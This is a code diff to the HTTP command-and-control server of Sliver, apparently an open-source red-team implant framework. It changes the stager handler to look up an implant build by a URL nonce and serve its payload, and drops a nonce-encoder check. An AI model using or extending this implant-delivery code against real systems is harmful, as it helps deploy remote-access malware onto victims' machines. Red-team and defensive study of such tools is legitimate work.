@@ -47,6 +47,7 @@ import (
 	"github.com/bishopfox/sliver/server/db"
 	"github.com/bishopfox/sliver/server/db/models"
 	"github.com/bishopfox/sliver/server/encoders"
+	"github.com/bishopfox/sliver/server/generate"
 	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
 	"github.com/bishopfox/sliver/server/log"
 	"github.com/bishopfox/sliver/server/website"
@@ -397,11 +398,6 @@ func getNonceFromURL(reqURL *url.URL) (uint64, error) {
 		httpLog.Warnf("Invalid nonce, failed to parse '%s'", qNonce)
 		return 0, err
 	}
-	_, _, err = encoders.EncoderFromNonce(nonce)
-	if err != nil {
-		httpLog.Warnf("Invalid nonce (%s)", err)
-		return 0, err
-	}
 	return nonce, nil
 }
 
@@ -750,6 +746,7 @@ func (s *SliverHTTPC2) closeHandler(resp http.ResponseWriter, req *http.Request)
 
 // stagerHandler - Serves the sliver shellcode to the stager requesting it
 func (s *SliverHTTPC2) stagerHandler(resp http.ResponseWriter, req *http.Request) {
+	nonce, _ := getNonceFromURL(req.URL)
 	httpLog.Debug("Stager request")
 	if len(s.SliverStage) != 0 {
 		httpLog.Infof("Received staging request from %s", getRemoteAddr(req))
@@ -757,6 +754,27 @@ func (s *SliverHTTPC2) stagerHandler(resp http.ResponseWriter, req *http.Request
 		resp.Write(s.SliverStage)
 		httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverStage), getRemoteAddr(req))
 		resp.WriteHeader(http.StatusOK)
+	} else if nonce != 0 {
+		resourceID, err := db.ResourceIDByValue(nonce)
+		if err != nil {
+			httpLog.Infof("No profile with id %#v", nonce)
+			s.defaultHandler(resp, req)
+			return
+		}
+		profile, _ := db.ImplantProfileByName(resourceID.Name)
+		build, _ := db.ImplantBuildByName(profile.ImplantConfig.FileName)
+		payload, err := generate.ImplantFileFromBuild(build)
+		if err != nil {
+			httpLog.Infof("Unable to retrieve Implant build %s", build)
+			s.defaultHandler(resp, req)
+			return
+		}
+		httpLog.Infof("Received staging request from %s", getRemoteAddr(req))
+		s.noCacheHeader(resp)
+		resp.Write(payload)
+		httpLog.Infof("Serving sliver shellcode (size %d) %s to %s", len(payload), resourceID.Name, getRemoteAddr(req))
+		resp.WriteHeader(http.StatusOK)
+
 	} else {
 		s.defaultHandler(resp, req)
 	}
